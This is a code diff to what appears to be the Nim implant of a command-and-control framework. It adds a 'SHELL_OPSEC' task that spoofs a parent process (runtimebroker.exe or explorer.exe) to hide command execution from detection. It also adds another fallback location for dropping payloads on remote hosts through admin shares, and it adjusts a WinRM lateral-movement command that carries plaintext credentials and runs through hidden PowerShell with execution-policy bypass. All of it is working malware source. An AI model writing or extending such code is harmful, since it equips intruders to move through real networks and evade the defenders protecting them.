@@ -219,6 +219,58 @@ proc runShell*(cmd: string): string =
       return output
   except: return "[error: " & getCurrentExceptionMsg() & "]"
 
+proc runShellOpsec*(cmd: string): string =
+  when defined(windows):
+    var parentPid: DWORD = 0
+    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+    if snap != INVALID_HANDLE_VALUE:
+      var pe: PROCESSENTRY32W
+      pe.dwSize = sizeof(pe).DWORD
+      if Process32FirstW(snap, addr pe).bool:
+        while true:
+          let name = ($cast[WideCString](addr pe.szExeFile[0])).toLowerAscii()
+          if name == "runtimebroker.exe":
+            parentPid = pe.th32ProcessID
+            break
+          elif parentPid == 0 and name == "explorer.exe":
+            parentPid = pe.th32ProcessID
+          if not Process32NextW(snap, addr pe).bool: break
+      discard CloseHandle(snap)
+    if parentPid == 0: return runShell(cmd)
+    let hParent = OpenProcess(PROCESS_CREATE_PROCESS, 0, parentPid)
+    if hParent == 0: return runShell(cmd)
+    defer: discard CloseHandle(hParent)
+    let outPath = "C:\\Windows\\Temp\\sbo" & $GetCurrentProcessId() & $GetTickCount() & ".tmp"
+    let cmdLine = "cmd.exe /d /c " & cmd & " > \"" & outPath & "\" 2>&1"
+    var siEx: STARTUPINFOEXW
+    siEx.StartupInfo.cb = sizeof(siEx).DWORD
+    siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW
+    siEx.StartupInfo.wShowWindow = 0
+    var attrSize: SIZE_T
+    discard InitializeProcThreadAttributeList(nil, 1, 0, addr attrSize)
+    let attrList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, attrSize))
+    defer: HeapFree(GetProcessHeap(), 0, attrList)
+    discard InitializeProcThreadAttributeList(attrList, 1, 0, addr attrSize)
+    discard UpdateProcThreadAttribute(attrList, 0,
+      evasion.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+      addr hParent, SIZE_T(sizeof(hParent)), nil, nil)
+    siEx.lpAttributeList = attrList
+    var pi: PROCESS_INFORMATION
+    let cmdW = newWideCString(cmdLine)
+    let ok = CreateProcessW(nil, cmdW, nil, nil, 0,
+      CREATE_NO_WINDOW or EXTENDED_STARTUPINFO_PRESENT,
+      nil, nil, addr siEx.StartupInfo, addr pi)
+    DeleteProcThreadAttributeList(attrList)
+    if not ok.bool: return runShell(cmd)
+    discard WaitForSingleObject(pi.hProcess, 30000)
+    discard CloseHandle(pi.hThread); discard CloseHandle(pi.hProcess)
+    try:
+      result = readFile(outPath)
+      discard tryRemoveFile(outPath)
+    except: result = "[no output]"
+  else:
+    return runShell(cmd)
+
 # ─────────────────────────────────────────────────────────────────────────────
 # Windows-only procs
 # ─────────────────────────────────────────────────────────────────────────────
@@ -1609,6 +1661,7 @@ when defined(windows):
       if user != "": discard runShell("net use \\\\" & host & "\\IPC$ /delete /y 2>&1")
     let unc1 = "\\\\" & host & "\\ADMIN$\\" & name
     let unc2 = "\\\\" & host & "\\C$\\Windows\\Temp\\" & name
+    let unc3 = "\\\\" & host & "\\C$\\Users\\Public\\" & name
     try:
       writeFile(unc1, cast[string](data))
       return "C:\\Windows\\" & name
@@ -1616,6 +1669,10 @@ when defined(windows):
     try:
       writeFile(unc2, cast[string](data))
       return "C:\\Windows\\Temp\\" & name
+    except: discard
+    try:
+      writeFile(unc3, cast[string](data))
+      return "C:\\Users\\Public\\" & name
     except: discard
     return ""
 
@@ -2073,6 +2130,9 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
   case typ.toUpperAscii()
   of "SHELL":
     t.sendResult(id, runShell(args), "")
+
+  of "SHELL_OPSEC":
+    t.sendResult(id, runShellOpsec(args), "")
 
   of "SLEEP":
     if args.strip().startsWith("{"):
@@ -3515,7 +3575,7 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
         let ps2 = addTrust2 &
           "$c=New-Object PSCredential('" & user2 & "',(ConvertTo-SecureString '" & pass2 &
           "' -AsPlainText -Force));Invoke-Command -ComputerName $ip -Authentication Negotiate" &
-          " -Credential $c -ScriptBlock {" & cmd3 & "}"
+          " -Credential $c -ScriptBlock {try{" & cmd3 & "|Out-String -Width 256}catch{$_.Exception.Message}}"
         t.sendResult(id, runShell("powershell -NoP -W Hidden -Exec Bypass -C \"" &
           ps2.replace("\"", "\\\"") & "\""), "")
       except: t.sendResult(id, "", "winrm_exec: " & getCurrentExceptionMsg())
